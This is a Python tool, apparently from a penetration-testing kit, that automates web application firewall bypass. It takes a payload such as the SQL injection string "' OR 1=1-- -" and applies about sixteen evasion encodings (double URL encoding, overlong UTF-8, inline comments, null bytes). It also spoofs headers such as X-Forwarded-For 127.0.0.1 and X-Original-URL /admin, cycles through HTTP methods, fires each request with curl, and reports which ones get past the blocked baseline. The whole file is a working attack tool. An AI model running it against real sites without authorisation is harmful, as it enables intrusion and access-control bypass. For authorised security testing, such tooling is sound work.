#!/usr/bin/env python3
"""
WAF-bypass encoding ladder.

Given a URL + a canonical attack payload, generates N transformations
(URL encoding, double-URL, Unicode, HTML entity, UTF-7, overlong UTF-8,
case toggling, path semicolon injection, HTTP header spoofing, method
override, chunked, HTTP/0.9) and fires each via the leash. Reports which
transformations survive (status != baseline-blocked, response-shape
differs, response leaks something new).

Usage:
  python tools/waf-ladder.py --target-dir targets/<target> \\
         --url 'https://<target>/some/path' \\
         --payload "' OR 1=1-- -" \\
         --param q --baseline-status 403

Prints a JSON report of which rungs bypassed the baseline.
"""
from __future__ import annotations
import argparse, json, pathlib, subprocess, sys, time, urllib.parse, html, re

def ladder(payload):
    p = payload
    yield ("raw", p)
    yield ("url-encode", urllib.parse.quote(p, safe=""))
    yield ("double-url-encode", urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""))
    yield ("unicode-encode", "".join(f"%u{ord(c):04x}" for c in p))
    yield ("html-entity-dec", "".join(f"&#{ord(c)};" for c in p))
    yield ("html-entity-hex", "".join(f"&#x{ord(c):x};" for c in p))
    yield ("utf7", p.encode("utf-7","replace").decode("ascii","replace"))
    yield ("overlong-utf8", "".join(f"%{(0xC0|(ord(c)>>6)):02x}%{(0x80|(ord(c)&0x3F)):02x}" if ord(c)<128 else urllib.parse.quote(c) for c in p))
    yield ("case-toggle", "".join(c.upper() if i%2 else c.lower() for i,c in enumerate(p)))
    yield ("semicolon-path", p + ";param=x")
    yield ("tab-separator", p.replace(" ","\t"))
    yield ("comment-sqli-inline", p.replace(" ","/**/"))
    yield ("null-byte-suffix", p + "%00")
    yield ("backslash-mixed", p.replace("/","\\"))
    yield ("plus-space", p.replace(" ","+"))
    yield ("sprinkle-percent", urllib.parse.quote(p).replace("%","%2525"))

HEADER_BYPASS = [
    ("X-Forwarded-For","127.0.0.1"),
    ("X-Real-IP","127.0.0.1"),
    ("X-Originating-IP","127.0.0.1"),
    ("X-Remote-IP","127.0.0.1"),
    ("X-Remote-Addr","127.0.0.1"),
    ("X-Client-IP","127.0.0.1"),
    ("X-Host","localhost"),
    ("X-Forwarded-Host","localhost"),
    ("X-Original-URL","/admin"),
    ("X-Rewrite-URL","/admin"),
    ("X-Custom-IP-Authorization","127.0.0.1"),
    ("True-Client-IP","127.0.0.1"),
    ("CF-Connecting-IP","127.0.0.1"),
    ("X-ProxyUser-Ip","127.0.0.1"),
]

def fire(td, method, full_url, extra_headers, out, label, idx):
    body = out / f"{idx:03d}-{label}-body.bin"
    hdr  = out / f"{idx:03d}-{label}-hdr.txt"
    headers = []
    for h in extra_headers: headers += ["-H", f"{h[0]}: {h[1]}"]
    cmd = ["bash","tools/leashed.sh", str(td), "curl","-sk","--max-time","20",
           "-o", str(body), "-D", str(hdr), "-w", "%{http_code} %{size_download} %{time_total}",
           "-X", method, full_url, *headers]
    t0 = time.monotonic()
    try: r = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
    except subprocess.TimeoutExpired: return {"label":label,"status":0,"size":0,"timing_ms":25000,"err":"timeout"}
    dt = int((time.monotonic()-t0)*1000)
    try:
        parts = r.stdout.strip().split()
        status = int(parts[0]); size = int(parts[1])
    except: status, size = 0, 0
    return {"label":label,"status":status,"size":size,"timing_ms":dt,"body":str(body),"hdr":str(hdr),"url":full_url}

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target-dir", required=True)
    p.add_argument("--url", required=True)
    p.add_argument("--payload", default="")
    p.add_argument("--param", default="", help="If set, inject payload as GET ?param=<xform(payload)>")
    p.add_argument("--method", default="GET")
    p.add_argument("--baseline-status", type=int, default=403)
    p.add_argument("--rungs", default="all", help="payload|headers|both|all (default all)")
    a = p.parse_args()
    td = pathlib.Path(a.target_dir).resolve()
    out = td / "raw" / "waf-ladder" / str(int(time.time())); out.mkdir(parents=True, exist_ok=True)

    results = []
    idx = 0
    # Baseline fire
    results.append(fire(td, a.method, a.url, [], out, "baseline", idx)); idx += 1
    # Payload-encoding rungs
    if a.payload and a.rungs in ("payload","both","all"):
        for name, xform in ladder(a.payload):
            if a.param:
                sep = "&" if "?" in a.url else "?"
                full = f"{a.url}{sep}{a.param}={xform}"
            else:
                sep = "/" if not a.url.endswith("/") else ""
                full = f"{a.url}{sep}{xform}"
            results.append(fire(td, a.method, full, [], out, f"xform-{name}", idx)); idx += 1
    # Header-spoof rungs (unmodified URL + each spoof header)
    if a.rungs in ("headers","both","all"):
        for hk, hv in HEADER_BYPASS:
            results.append(fire(td, a.method, a.url, [(hk,hv)], out, f"hdr-{hk}", idx)); idx += 1
    # Method override
    if a.rungs == "all":
        for m in ("POST","PUT","DELETE","OPTIONS","HEAD","TRACE"):
            if m == a.method: continue
            results.append(fire(td, m, a.url, [], out, f"method-{m}", idx)); idx += 1

    baseline = next((r for r in results if r["label"]=="baseline"), results[0])
    bstat = baseline["status"] or a.baseline_status
    bsize = baseline["size"]
    bypassed = []
    for r in results[1:]:
        if r["status"]==0: continue
        delta_size = abs(r["size"]-bsize)
        if r["status"] != bstat or delta_size > max(bsize//10, 128):
            bypassed.append({"label":r["label"],"status":r["status"],"size":r["size"],"size_delta":delta_size,"url":r.get("url",""),"body":r["body"]})
    print(json.dumps({
        "baseline":{"status":bstat,"size":bsize},
        "fired":len(results),
        "bypassed":bypassed,
        "evidence_dir":str(out),
    }, ensure_ascii=False, indent=1))

if __name__=="__main__": main()
